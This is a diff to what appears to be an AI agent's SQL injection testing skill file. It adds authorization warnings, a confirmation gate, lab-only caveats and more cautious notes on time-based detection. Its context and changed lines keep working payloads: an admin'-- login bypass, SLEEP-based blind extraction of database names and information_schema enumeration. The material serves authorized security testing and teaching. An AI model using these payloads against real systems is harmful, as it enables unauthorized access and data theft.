@@ -7,6 +7,20 @@ author: zebbern
 date_added: "2026-02-27"
 ---
 
+> **⚠️ AUTHORIZED USE ONLY**
+> This skill is for educational purposes or authorized security assessments only.
+> You must have explicit, written permission from the system owner before using this tool.
+> Misuse of this tool is illegal and strictly prohibited.
+
+> **Mandatory confirmation gate**
+> Before running any command that probes, exploits, changes, persists on, extracts data from, or attempts credential access against a target:
+> 1. Ask the user to state the exact target URL, IP, account, or resource.
+> 2. Ask the user to confirm written authorization and the permitted scope.
+> 3. Show the exact command(s) and explain their expected effect.
+> 4. Wait for explicit confirmation in the current conversation.
+>
+> Without that confirmation, remain read-only and provide defensive guidance only. Prefer a sandbox, disposable VM, or controlled lab.
+
 > AUTHORIZED USE ONLY: Use this skill only for authorized security assessments, defensive validation, or controlled educational environments.
 
 # SQL Injection Testing
@@ -173,6 +187,8 @@ Use database sleep functions for confirmation:
 ```
 
 #### Out-of-Band (OOB) Extraction
+
+Lab-only illustrations. Replace all callback domains with the explicitly authorized test receiver; do not contact the literal example domains or send real data. Network callbacks may require DB-specific privileges, platform support and egress.
 Exfiltrate data through external channels:
 
 ```sql
@@ -209,16 +225,18 @@ admin' AND '1'='2
 Query transformation example:
 ```sql
 -- Original query
-SELECT * FROM users WHERE username='input' AND password='input'
+SELECT * FROM users WHERE username='input' AND password='input' -- security-allowlist: controlled SQL injection test example
 
 -- Injected (username: admin'--)
-SELECT * FROM users WHERE username='admin'--' AND password='anything'
+SELECT * FROM users WHERE username='admin'--' AND password='anything' -- security-allowlist: controlled SQL injection bypass example
 -- Password check bypassed via comment
 ```
 
 ### Phase 4: Filter Bypass Techniques
 
 #### Character Encoding Bypass
+
+These historical payloads are parser/filter-specific, not portable bypasses. Unicode lookalikes, null bytes and comments inserted inside keywords often do not parse as SQL. Validate only against a declared database/version in an authorized fixture.
 When special characters are blocked:
 
 ```sql
@@ -302,8 +320,11 @@ SELECT * FROM v$version
 
 ### Information Schema Queries
 ```sql
--- MySQL/MSSQL table enumeration
+-- MySQL table enumeration
 SELECT table_name FROM information_schema.tables WHERE table_schema=database()
+
+-- MSSQL: use the intended schema in the current authorized database
+SELECT table_name FROM information_schema.tables WHERE table_schema='dbo'
 
 -- Column enumeration
 SELECT column_name FROM information_schema.columns WHERE table_name='users'
@@ -383,13 +404,14 @@ Response: Displays admin credentials
 **Confirm Vulnerability**:
 ```sql
 id=5' AND SLEEP(5)-- 
--- Response delayed by 5 seconds (vulnerable confirmed)
+-- A delay is an indicator only; compare bounded repeated true/false controls
+-- against baseline latency before attributing it to SQL execution.
 ```
 
 **Extract Database Name Length**:
 ```sql
 id=5' AND IF(LENGTH(database())=8,SLEEP(5),0)--
--- Delay confirms database name is 8 characters
+-- A reproducible controlled delay may support this hypothesis; one sample does not confirm it.
 ```
 
 **Extract Characters**:
@@ -404,7 +426,7 @@ id=5' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--
 
 **Standard Login Query**:
 ```sql
-SELECT * FROM users WHERE username='[input]' AND password='[input]'
+SELECT * FROM users WHERE username='[input]' AND password='[input]' -- security-allowlist: controlled SQL injection test example
 ```
 
 **Injection Payload**:
@@ -415,7 +437,7 @@ Password: anything
 
 **Resulting Query**:
 ```sql
-SELECT * FROM users WHERE username='administrator'--' AND password='anything'
+SELECT * FROM users WHERE username='administrator'--' AND password='anything' -- security-allowlist: controlled SQL injection bypass example
 ```
 
 **Result**: Password check bypassed, authenticated as administrator.
@@ -446,7 +468,7 @@ SELECT * FROM users WHERE username='administrator'--' AND password='anything'
 
 ### Time-Based Injection Inconsistent
 - Network latency may cause false positives
-- Use longer delays (10+ seconds) for clarity
+- Use a bounded low-impact test window and repeated controls; do not increase delays without load/availability authorization
 - Run multiple tests to confirm pattern
 - Consider server-side caching effects
 
